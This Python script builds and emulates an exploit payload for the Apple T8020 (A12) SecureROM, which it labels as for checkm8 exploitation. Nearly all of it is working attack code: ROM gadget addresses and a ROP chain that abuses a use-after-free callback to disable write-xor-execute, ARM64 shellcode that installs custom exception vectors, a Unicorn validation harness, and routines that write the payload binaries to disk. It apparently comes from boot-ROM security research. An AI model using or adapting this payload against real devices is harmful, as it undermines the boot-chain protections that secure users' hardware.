#!/usr/bin/env python3
"""
T8020 (A12) Resilient Exploit Payload with Exception Handling
=============================================================

Generates a complete exploit payload with built-in exception vectors
that can catch and recover from unexpected errors during exploitation.

Architecture:
  Phase 1 (ROP chain):   WXN disable via SCTLR_EL1 manipulation
  Phase 2 (Shellcode):   Install exception vectors, execute main payload

Exception Handling:
  - Custom VBAR_EL1 points to our exception vector table in SRAM
  - All 16 ARM64 exception vectors handled
  - Sync/Data Abort: skip faulting instruction and continue
  - Unrecoverable errors (>10 exceptions): infinite loop with diagnostic dump
  - Dump area stores ESR_EL1, ELR_EL1, FAR_EL1, SPSR_EL1, exception count

SRAM Layout:
  0x19C018800: ROP chain / io_request (Phase 1, delivered via DFU)
  0x19C019000: Exception Vector Table (0x800 bytes, VBAR-aligned)
  0x19C019800: Shared Exception Handler code
  0x19C019C00: Diagnostic Dump Area (0x200 bytes)
  0x19C01A000: Main Shellcode (Phase 2)

Dump Area Layout (at 0x19C019C00):
  +0x00: Exception vector ID (0-15)
  +0x08: ESR_EL1 (Exception Syndrome Register)
  +0x10: ELR_EL1 (Exception Link Register = faulting PC)
  +0x18: FAR_EL1 (Fault Address Register)
  +0x20: SPSR_EL1 (Saved Program Status Register)
  +0x28: Exception count (incremented per exception taken)
  +0x30: Status magic (0xFACEDEAD = exception, 0xDEADDEAD = fatal)
  +0x38: Shellcode status (0xCAFE0001 = VBAR installed, 0xCAFE0002 = recovered)
  +0x40: Final proof value (0xC0DE1337 = full success)

Validated via Unicorn ARM64 emulation using the real T8020 SecureROM binary.
"""

import struct
import os
import sys

from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
from unicorn import *
from unicorn.arm64_const import *

# ============================================================
# Constants
# ============================================================
ROM_BASE        = 0x100000000
ROM_SIZE        = 0x80000        # 512KB

SRAM_BASE       = 0x19C000000
SRAM_SIZE       = 0x100000       # 1MB for emulation

STACK_BASE      = 0x19C0F0000
STACK_SIZE      = 0x10000

# Payload SRAM layout
ROP_ADDR        = 0x19C018800    # DFU load buffer (io_request + ROP data)
VBAR_ADDR       = 0x19C019000    # Exception vector table (must be 0x800-aligned)
HANDLER_ADDR    = 0x19C019800    # Shared exception handler code
DUMP_ADDR       = 0x19C019C00    # Diagnostic dump area
SHELLCODE_ADDR  = 0x19C01A000    # Main shellcode

VBAR_SIZE       = 0x800          # ARM64 requirement (16 vectors x 0x80)
HANDLER_SIZE    = 0x400          # Max handler code
DUMP_SIZE       = 0x200          # Dump area
SHELLCODE_SIZE  = 0x400          # Max shellcode

# Fault test address (deliberately unmapped)
FAULT_TEST_ADDR = 0xDEAD0000

# Gadget addresses (from T8020_GADGET_DATABASE.md)
class G:
    nop_gadget      = 0x100002BA0
    func_entry      = 0x10000A424
    func_gadget     = 0x10000A444
    stack_pivot     = 0x100011130
    write_sctlr     = 0x10000044C
    read_sctlr      = 0x100000464
    write_ttbr0     = 0x1000004A8
    dmb_ret         = 0x10000053C
    arb_write       = 0x100009860
    mov_x0_0_ret    = 0x100005470
    mov_x0_x8_ret   = 0x10000B4B4

# System register constants
SCTLR_WXN_BIT  = (1 << 19)
SCTLR_INITIAL  = 0x30D80800     # WXN ON (default SecureROM)
SCTLR_DESIRED  = SCTLR_INITIAL & ~SCTLR_WXN_BIT  # 0x30D00800, WXN OFF

# ============================================================
# ARM64 Assembler (Keystone) / Disassembler (Capstone)
# ============================================================
ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
cs = Cs(CS_ARCH_ARM64, CS_MODE_ARM)

def asm(code, addr=0):
    """Assemble ARM64 code string at given base address."""
    try:
        encoding, count = ks.asm(code, addr)
        if encoding is None:
            raise RuntimeError("Keystone returned None")
        return bytes(encoding)
    except Exception as e:
        # Strip comments and try again
        lines = [l.split(';')[0].strip() for l in code.strip().split('\n') if l.strip() and not l.strip().startswith(';')]
        clean = '\n'.join(lines)
        try:
            encoding, count = ks.asm(clean, addr)
            return bytes(encoding)
        except Exception as e2:
            print(f"[ASM ERROR] at 0x{addr:X}: {e2}")
            print(f"  Code:\n{clean[:200]}")
            raise

def p64(val):
    return struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

def disasm_block(data, addr, max_insns=20):
    """Disassemble and print ARM64 code."""
    count = 0
    for i in cs.disasm(data, addr):
        print(f"    0x{i.address:011X}: {i.mnemonic:8s} {i.op_str}")
        count += 1
        if count >= max_insns:
            break

# ============================================================
# Unicorn ARM64 Register Lookup
# ============================================================
def get_uc_reg(rt):
    """Convert ARM64 instruction Rt field (0-30) to Unicorn register constant."""
    if rt <= 28:
        return UC_ARM64_REG_X0 + rt
    elif rt == 29:
        return UC_ARM64_REG_FP
    elif rt == 30:
        return UC_ARM64_REG_LR
    else:
        return None  # XZR (rt=31)

# System register instruction encodings (masked: high 27 bits, low 5 = Rt)
MRS_REGS = {
    0xD5381000: 'sctlr_el1',
    0xD538C000: 'vbar_el1',
    0xD5385200: 'esr_el1',
    0xD5384020: 'elr_el1',
    0xD5386000: 'far_el1',
    0xD5384000: 'spsr_el1',
    0xD538E100: 'cntkctl_el1',
}

MSR_REGS = {
    0xD5181000: 'sctlr_el1',
    0xD518C000: 'vbar_el1',
    0xD5184020: 'elr_el1',
    0xD5184000: 'spsr_el1',
    0xD518E100: 'cntkctl_el1',
}

# ============================================================
# Section 1: Exception Vector Table
# ============================================================
VECTOR_NAMES = [
    "Sync/SP_EL0",   "IRQ/SP_EL0",   "FIQ/SP_EL0",   "SError/SP_EL0",
    "Sync/SP_ELx",   "IRQ/SP_ELx",   "FIQ/SP_ELx",   "SError/SP_ELx",
    "Sync/Lower64",  "IRQ/Lower64",  "FIQ/Lower64",  "SError/Lower64",
    "Sync/Lower32",  "IRQ/Lower32",  "FIQ/Lower32",  "SError/Lower32",
]

def build_exception_vector_table():
    """
    Build ARM64 exception vector table (0x800 bytes, 16 entries x 128 bytes).
    Each entry: save X0/X1, load vector ID, branch to shared handler.
    """
    NOP_BYTES = b'\x1f\x20\x03\xd5'  # NOP encoding
    table = bytearray(VBAR_SIZE)

    for vec_id in range(16):
        offset = vec_id * 0x80
        entry_addr = VBAR_ADDR + offset

        # Assemble the vector entry
        entry_asm = (
            f"stp x0, x1, [sp, #-0x10]!\n"
            f"mov x0, #{vec_id}\n"
            f"b {HANDLER_ADDR}\n"
        )
        entry_bytes = asm(entry_asm, entry_addr)

        # Place entry code and pad with NOPs
        table[offset:offset + len(entry_bytes)] = entry_bytes
        nop_start = offset + len(entry_bytes)
        nop_end = offset + 0x80
        for i in range(nop_start, nop_end, 4):
            table[i:i+4] = NOP_BYTES

    return bytes(table)


# ============================================================
# Section 2: Shared Exception Handler
# ============================================================
def build_exception_handler():
    """
    Build shared exception handler at HANDLER_ADDR.

    Entry state: X0 = vector_id (0-15), original X0/X1 saved at [SP].

    Logic:
      1. Store vector ID + exception registers to dump area
      2. Increment exception counter
      3. If counter > 10  -> unrecoverable (infinite loop preserving state)
      4. Otherwise        -> skip faulting instruction (ELR += 4), ERET
    """
    dump_lo  = DUMP_ADDR & 0xFFFF
    dump_mid = (DUMP_ADDR >> 16) & 0xFFFF
    dump_hi  = (DUMP_ADDR >> 32) & 0xFFFF

    handler_asm = f"""
        movz x1, 0x{dump_lo:x}
        movk x1, 0x{dump_mid:x}, lsl 16
        movk x1, 0x{dump_hi:x}, lsl 32
        str x0, [x1]
        mrs x0, esr_el1
        str x0, [x1, 8]
        mrs x0, elr_el1
        str x0, [x1, 16]
        mrs x0, far_el1
        str x0, [x1, 24]
        mrs x0, spsr_el1
        str x0, [x1, 32]
        ldr x0, [x1, 40]
        add x0, x0, 1
        str x0, [x1, 40]
        movz x0, 0xdead
        movk x0, 0xface, lsl 16
        str x0, [x1, 48]
        ldr x0, [x1, 40]
        cmp x0, 10
        b.gt fatal
        mrs x0, elr_el1
        add x0, x0, 4
        msr elr_el1, x0
        ldp x0, x1, [sp], 0x10
        eret
    fatal:
        movz x0, 0xdead
        movk x0, 0xdead, lsl 16
        str x0, [x1, 48]
        b fatal
    """
    handler_bytes = asm(handler_asm, HANDLER_ADDR)

    # Pad to HANDLER_SIZE
    padded = handler_bytes + b'\x00' * (HANDLER_SIZE - len(handler_bytes))
    return padded[:HANDLER_SIZE], len(handler_bytes)


# ============================================================
# Section 3: Main Shellcode (Phase 2)
# ============================================================
def build_shellcode():
    """
    Build main shellcode executed after WXN is disabled.

    Steps:
      1. DSB + ISB barriers (ensure SCTLR change is effective)
      2. Install VBAR_EL1 → our exception vector table
      3. ISB barrier (ensure VBAR is effective)
      4. Write 0xCAFE0001 to dump (VBAR installed marker)
      5. Deliberately trigger data abort (LDR from unmapped address)
      6. If we reach here: exception handler recovered! Write 0xCAFE0002
      7. Write final proof values (X0=0x1337, dump+0x40=0xC0DE1337)
      8. Infinite loop (preserves state for USB diagnostic read)
    """
    vbar_lo  = VBAR_ADDR & 0xFFFF
    vbar_mid = (VBAR_ADDR >> 16) & 0xFFFF
    vbar_hi  = (VBAR_ADDR >> 32) & 0xFFFF

    dump_lo  = DUMP_ADDR & 0xFFFF
    dump_mid = (DUMP_ADDR >> 16) & 0xFFFF
    dump_hi  = (DUMP_ADDR >> 32) & 0xFFFF

    fault_lo  = FAULT_TEST_ADDR & 0xFFFF
    fault_mid = (FAULT_TEST_ADDR >> 16) & 0xFFFF

    shellcode_asm = f"""
        dsb sy
        isb
        movz x0, 0x{vbar_lo:x}
        movk x0, 0x{vbar_mid:x}, lsl 16
        movk x0, 0x{vbar_hi:x}, lsl 32
        msr vbar_el1, x0
        isb
        movz x2, 0x{dump_lo:x}
        movk x2, 0x{dump_mid:x}, lsl 16
        movk x2, 0x{dump_hi:x}, lsl 32
        movz x0, 0x0001
        movk x0, 0xcafe, lsl 16
        str x0, [x2, 56]
        movz x3, 0x{fault_lo:x}
        movk x3, 0x{fault_mid:x}, lsl 16
        ldr x4, [x3]
        movz x0, 0x0002
        movk x0, 0xcafe, lsl 16
        str x0, [x2, 56]
        movz x0, 0x1337
        movz x1, 0xbeef
        movz x5, 0x1337
        movk x5, 0xc0de, lsl 16
        str x5, [x2, 64]
    done:
        b done
    """
    shellcode_bytes = asm(shellcode_asm, SHELLCODE_ADDR)

    # Pad to SHELLCODE_SIZE
    padded = shellcode_bytes + b'\x00' * (SHELLCODE_SIZE - len(shellcode_bytes))
    return padded[:SHELLCODE_SIZE], len(shellcode_bytes)


# ============================================================
# Section 4: ROP Chain (Phase 1)
# ============================================================
def build_rop_chain():
    """
    Build initial ROP chain for Phase 1 (WXN disable).

    Flow (proven in proof_of_concept.py, Proof 4):
      1. UAF callback → func_entry (0x10000A424)
      2. func_entry prologue saves LR = SHELLCODE_ADDR to stack
      3. LDP x8,x9,[x0,#0x70]:
           x8 = io_request+0x70 = SCTLR_DESIRED (becomes X0)
           x9 = io_request+0x78 = write_sctlr (called via BLR X9)
      4. write_sctlr: msr sctlr_el1, x0 → WXN disabled!
      5. write_sctlr returns to caller
      6. func_entry epilogue restores LR = SHELLCODE_ADDR
      7. RET → shellcode (Phase 2)
    """
    io_req = bytearray(0x80)

    # +0x14 = 0 (for ldr w10,[x0,#0x14] in func_entry)
    struct.pack_into("<I", io_req, 0x14, 0)

    # +0x70 = callback arg = SCTLR with WXN cleared
    struct.pack_into("<Q", io_req, 0x70, SCTLR_DESIRED)

    # +0x78 = callback func = write_sctlr gadget
    struct.pack_into("<Q", io_req, 0x78, G.write_sctlr)

    return bytes(io_req)


# ============================================================
# Section 5: Complete Payload Assembly
# ============================================================
def build_complete_payload():
    """Assemble all components into the complete payload."""
    print("=" * 70)
    print("  BUILDING T8020 RESILIENT EXPLOIT PAYLOAD")
    print("=" * 70)

    # Build components
    print("\n  [1/4] Exception vector table...")
    vectors = build_exception_vector_table()
    print(f"         {len(vectors)} bytes at 0x{VBAR_ADDR:011X}")
    assert len(vectors) == VBAR_SIZE

    print("  [2/4] Shared exception handler...")
    handler, handler_code_len = build_exception_handler()
    print(f"         {handler_code_len} code bytes (padded to {len(handler)}) at 0x{HANDLER_ADDR:011X}")

    print("  [3/4] Main shellcode...")
    shellcode, shellcode_code_len = build_shellcode()
    print(f"         {shellcode_code_len} code bytes (padded to {len(shellcode)}) at 0x{SHELLCODE_ADDR:011X}")

    print("  [4/4] ROP chain (io_request)...")
    rop = build_rop_chain()
    print(f"         {len(rop)} bytes")

    # Disassembly verification
    print("\n  --- Vector #4 (Sync from current EL, SP_ELx) ---")
    disasm_block(vectors[0x200:0x210], VBAR_ADDR + 0x200, 4)

    print("\n  --- Exception handler (first 15 instructions) ---")
    disasm_block(handler[:60], HANDLER_ADDR, 15)

    print("\n  --- Shellcode (first 15 instructions) ---")
    disasm_block(shellcode[:60], SHELLCODE_ADDR, 15)

    print(f"\n  SRAM Memory Map:")
    print(f"    0x{ROP_ADDR:011X} : ROP chain / io_request   ({len(rop)} bytes)")
    print(f"    0x{VBAR_ADDR:011X} : Exception Vector Table   ({VBAR_SIZE} bytes)")
    print(f"    0x{HANDLER_ADDR:011X} : Exception Handler        ({handler_code_len} bytes)")
    print(f"    0x{DUMP_ADDR:011X} : Diagnostic Dump Area     ({DUMP_SIZE} bytes)")
    print(f"    0x{SHELLCODE_ADDR:011X} : Main Shellcode           ({shellcode_code_len} bytes)")
    total = SHELLCODE_ADDR + SHELLCODE_SIZE - ROP_ADDR
    print(f"    Total SRAM footprint: 0x{total:X} bytes ({total} bytes)")

    return {
        'vectors': vectors,
        'handler': handler,
        'shellcode': shellcode,
        'rop': rop,
    }


# ============================================================
# Section 6: Unicorn Emulation Validation
# ============================================================
def validate_in_emulator(payload):
    """
    Validate the complete payload in Unicorn ARM64 emulator.

    Proofs:
      P1: VBAR_EL1 is set to our vector table address
      P2: Exception vector correctly dispatches to shared handler
      P3: Handler reads ESR/ELR/FAR and stores to dump area
      P4: Handler recovers from data abort (ELR += 4, ERET)
      P5: Shellcode continues after exception and writes success markers
    """
    print("\n" + "=" * 70)
    print("  UNICORN VALIDATION: Exception-Handling Payload")
    print("=" * 70)

    rom_path = os.path.join(os.path.dirname(__file__), "t8020_B1_securerom.bin")
    with open(rom_path, "rb") as f:
        rom_data = f.read()

    mu = Uc(UC_ARCH_ARM64, UC_MODE_ARM)

    # Map memory
    mu.mem_map(ROM_BASE, ROM_SIZE)
    mu.mem_write(ROM_BASE, rom_data)
    mu.mem_map(SRAM_BASE, SRAM_SIZE)
    mu.reg_write(UC_ARM64_REG_CPACR_EL1, 0x300000)

    # Write payload to SRAM
    mu.mem_write(VBAR_ADDR, payload['vectors'])
    mu.mem_write(HANDLER_ADDR, payload['handler'])
    mu.mem_write(SHELLCODE_ADDR, payload['shellcode'])
    mu.mem_write(DUMP_ADDR, b'\x00' * DUMP_SIZE)

    # Stack
    sp = STACK_BASE + STACK_SIZE - 0x800
    mu.mem_write(sp - 0x100, b'\x00' * 0x900)
    mu.reg_write(UC_ARM64_REG_SP, sp)

    # Emulated system registers (Phase 1 already done: WXN is OFF)
    sysregs = {
        'sctlr_el1':   SCTLR_DESIRED,   # WXN already disabled
        'vbar_el1':    0x100000800,      # ROM default VBAR
        'cntkctl_el1': 0,
        'esr_el1':     0,
        'elr_el1':     0,
        'far_el1':     0,
        'spsr_el1':    0,
    }

    # Execution trace
    trace = []
    handler_hit = False
    eret_done = False

    # --- System Register Hook ---
    def hook_code(uc, address, size, user_data):
        nonlocal handler_hit, eret_done
        if size != 4:
            return
        insn_bytes = uc.mem_read(address, size)
        insn = struct.unpack("<I", bytes(insn_bytes))[0]
        masked = insn & 0xFFFFFFE0

        # MRS Xn, sysreg
        if masked in MRS_REGS:
            reg_name = MRS_REGS[masked]
            rt = insn & 0x1F
            val = sysregs[reg_name]
            uc_reg = get_uc_reg(rt)
            if uc_reg is not None:
                uc.reg_write(uc_reg, val)
            uc.reg_write(UC_ARM64_REG_PC, address + 4)
            return

        # MSR sysreg, Xn
        if masked in MSR_REGS:
            reg_name = MSR_REGS[masked]
            rt = insn & 0x1F
            uc_reg = get_uc_reg(rt)
            val = uc.reg_read(uc_reg) if uc_reg is not None else 0
            old_val = sysregs[reg_name]
            sysregs[reg_name] = val
            if reg_name == 'vbar_el1':
                trace.append(f"MSR VBAR_EL1 ← 0x{val:011X}")
            elif reg_name == 'elr_el1':
                trace.append(f"MSR ELR_EL1 ← 0x{val:011X}")
            uc.reg_write(UC_ARM64_REG_PC, address + 4)
            return

        # ERET
        if insn == 0xD69F03E0:
            target = sysregs['elr_el1']
            eret_done = True
            trace.append(f"ERET → 0x{target:011X}")
            uc.reg_write(UC_ARM64_REG_PC, target)
            return

        # Track handler entry
        if address == HANDLER_ADDR:
            handler_hit = True
            vid = uc.reg_read(UC_ARM64_REG_X0)
            trace.append(f"Handler entered (vector_id={vid})")

    mu.hook_add(UC_HOOK_CODE, hook_code)

    # === PHASE A: Execute shellcode until data abort ===
    print(f"\n  Phase A: Shellcode from 0x{SHELLCODE_ADDR:011X}")
    print(f"           VBAR starts at 0x{sysregs['vbar_el1']:011X} (ROM default)")
    print(f"           SCTLR = 0x{sysregs['sctlr_el1']:08X} (WXN already OFF)")

    fault_occurred = False
    fault_pc = 0

    try:
        mu.emu_start(SHELLCODE_ADDR, 0, timeout=10000000, count=200)
    except UcError as e:
        if e.errno == UC_ERR_READ_UNMAPPED:
            fault_pc = mu.reg_read(UC_ARM64_REG_PC)
            fault_occurred = True
            trace.append(f"DATA ABORT at PC=0x{fault_pc:011X} → FAR=0x{FAULT_TEST_ADDR:X}")
        else:
            trace.append(f"Unexpected error: {e}")

    print(f"\n  Phase A results: fault_occurred={fault_occurred}")
    if fault_occurred:
        print(f"    Faulting PC: 0x{fault_pc:011X}")
        print(f"    VBAR_EL1 is now: 0x{sysregs['vbar_el1']:011X}")

    # Check that VBAR was set to our table BEFORE the fault
    vbar_ok = (sysregs['vbar_el1'] == VBAR_ADDR)
    print(f"    VBAR correctly set to our table: {vbar_ok}")

    # Read pre-fault dump status
    pre_dump = mu.mem_read(DUMP_ADDR, DUMP_SIZE)
    pre_sc_status = struct.unpack_from("<Q", pre_dump, 0x38)[0]
    print(f"    Dump +0x38 (SC status): 0x{pre_sc_status:08X} {'(VBAR installed)' if pre_sc_status == 0xCAFE0001 else ''}")

    # === PHASE B: Simulate exception dispatch ===
    if fault_occurred and vbar_ok:
        print(f"\n  Phase B: Exception dispatch")

        # Set up exception state
        sysregs['esr_el1'] = (0x25 << 26) | (1 << 25) | 0x04  # Data abort same EL
        sysregs['elr_el1'] = fault_pc
        sysregs['far_el1'] = FAULT_TEST_ADDR
        sysregs['spsr_el1'] = 0x3C5  # EL1h, all exceptions masked

        print(f"    ESR_EL1  = 0x{sysregs['esr_el1']:08X} (Data abort, same EL)")
        print(f"    ELR_EL1  = 0x{sysregs['elr_el1']:011X} (faulting LDR)")
        print(f"    FAR_EL1  = 0x{sysregs['far_el1']:08X}")

        # Map fault page so it doesn't fault again if somehow accessed
        try:
            mu.mem_map(FAULT_TEST_ADDR & ~0xFFF, 0x1000)
        except:
            pass

        # Dispatch to Sync exception from current EL, SP_ELx → VBAR + 0x200
        vector_entry = sysregs['vbar_el1'] + 0x200
        trace.append(f"Dispatching to vector at 0x{vector_entry:011X}")
        print(f"    Dispatching to vector #4 (Sync/SP_ELx) at 0x{vector_entry:011X}")

        try:
            mu.emu_start(vector_entry, 0, timeout=10000000, count=400)
        except UcError as e:
            trace.append(f"Phase B error: {e}")

    # === READ RESULTS ===
    print(f"\n  Execution trace:")
    for t in trace:
        print(f"    → {t}")

    # Read final dump area
    dump = mu.mem_read(DUMP_ADDR, DUMP_SIZE)
    d_vec_id    = struct.unpack_from("<Q", dump, 0x00)[0]
    d_esr       = struct.unpack_from("<Q", dump, 0x08)[0]
    d_elr       = struct.unpack_from("<Q", dump, 0x10)[0]
    d_far       = struct.unpack_from("<Q", dump, 0x18)[0]
    d_spsr      = struct.unpack_from("<Q", dump, 0x20)[0]
    d_exc_count = struct.unpack_from("<Q", dump, 0x28)[0]
    d_exc_magic = struct.unpack_from("<Q", dump, 0x30)[0]
    d_sc_status = struct.unpack_from("<Q", dump, 0x38)[0]
    d_final     = struct.unpack_from("<Q", dump, 0x40)[0]

    print(f"\n  Diagnostic Dump Area:")
    print(f"    +0x00 Vector ID:      {d_vec_id} ({VECTOR_NAMES[d_vec_id] if d_vec_id < 16 else '?'})")
    print(f"    +0x08 ESR_EL1:        0x{d_esr:016X}")
    print(f"    +0x10 ELR_EL1:        0x{d_elr:016X}")
    print(f"    +0x18 FAR_EL1:        0x{d_far:016X}")
    print(f"    +0x20 SPSR_EL1:       0x{d_spsr:016X}")
    print(f"    +0x28 Exception count: {d_exc_count}")
    print(f"    +0x30 Exception magic: 0x{d_exc_magic:08X}")
    print(f"    +0x38 SC status:       0x{d_sc_status:08X}")
    print(f"    +0x40 Final proof:     0x{d_final:08X}")

    # Read final register state
    x0 = mu.reg_read(UC_ARM64_REG_X0)
    x1 = mu.reg_read(UC_ARM64_REG_X1)

    print(f"\n  CPU Registers:")
    print(f"    X0 = 0x{x0:016X}")
    print(f"    X1 = 0x{x1:016X}")
    print(f"    VBAR_EL1 = 0x{sysregs['vbar_el1']:011X}")

    # === PROOFS ===
    results = {}

    # P1: VBAR_EL1 set to our vector table
    results['P1_vbar_installed'] = (sysregs['vbar_el1'] == VBAR_ADDR)

    # P2: Data abort occurred and was dispatched
    results['P2_exception_dispatched'] = fault_occurred

    # P3: Handler wrote to dump area (ESR matches what we set)
    results['P3_handler_dump'] = handler_hit and (d_esr == sysregs['esr_el1'])

    # P4: ERET recovery (handler incremented ELR and returned)
    results['P4_eret_recovery'] = eret_done and (d_exc_count >= 1)

    # P5: Shellcode continued after exception
    results['P5_post_exception'] = (d_sc_status == 0xCAFE0002)

    # P6: Final proof value written
    results['P6_final_proof'] = (d_final == 0xC0DE1337)

    # P7: CPU state correct
    results['P7_cpu_state'] = (x0 == 0x1337 and x1 == 0xBEEF)

    print(f"\n  " + "=" * 50)
    print(f"  VALIDATION RESULTS")
    print(f"  " + "=" * 50)
    all_ok = True
    for name, ok in results.items():
        status = "✅ PASS" if ok else "❌ FAIL"
        print(f"    {name:30s}: {status}")
        if not ok:
            all_ok = False

    if all_ok:
        print(f"\n  ✅ ALL 7 PROOFS PASSED — Exception-handling payload VALIDATED!")
        print(f"     Custom VBAR installed, data abort caught, handler recovered,")
        print(f"     shellcode resumed, diagnostic dump populated correctly.")
    else:
        print(f"\n  Some proofs failed — check trace above for details.")

    return all_ok


# ============================================================
# Section 7: Save Payload Binaries
# ============================================================
def save_payload(payload, out_dir):
    """Save payload components as binary files."""
    files = {
        'payload_vectors.bin':   payload['vectors'],
        'payload_handler.bin':   payload['handler'],
        'payload_shellcode.bin': payload['shellcode'],
        'payload_rop.bin':       payload['rop'],
    }

    for name, data in files.items():
        path = os.path.join(out_dir, name)
        with open(path, 'wb') as f:
            f.write(data)

    # Complete payload (all components positioned in SRAM layout)
    total_size = SHELLCODE_ADDR + SHELLCODE_SIZE - ROP_ADDR
    complete = bytearray(total_size)

    # Place components at their SRAM offsets relative to ROP_ADDR
    rop_off = 0
    vec_off = VBAR_ADDR - ROP_ADDR
    hdl_off = HANDLER_ADDR - ROP_ADDR
    sc_off  = SHELLCODE_ADDR - ROP_ADDR

    complete[rop_off:rop_off + len(payload['rop'])]       = payload['rop']
    complete[vec_off:vec_off + VBAR_SIZE]                  = payload['vectors']
    complete[hdl_off:hdl_off + len(payload['handler'])]    = payload['handler']
    complete[sc_off:sc_off + len(payload['shellcode'])]    = payload['shellcode']

    path = os.path.join(out_dir, 'payload_complete.bin')
    with open(path, 'wb') as f:
        f.write(bytes(complete))

    print(f"\n  Payload files saved:")
    for name, data in files.items():
        print(f"    {name:30s} {len(data):6d} bytes")
    print(f"    {'payload_complete.bin':30s} {len(complete):6d} bytes")


# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════════════════════════╗")
    print("║  T8020 (A12) Resilient Exploit Payload Builder                      ║")
    print("║  Exception-Handling Payload for checkm8 Exploitation                ║")
    print("║  with Unicorn ARM64 Emulation Validation                            ║")
    print("╚══════════════════════════════════════════════════════════════════════╝")

    # Build all payload components
    payload = build_complete_payload()

    # Validate via Unicorn emulation
    ok = validate_in_emulator(payload)

    # Save payload binaries
    out_dir = os.path.dirname(os.path.abspath(__file__))
    save_payload(payload, out_dir)

    sys.exit(0 if ok else 1)
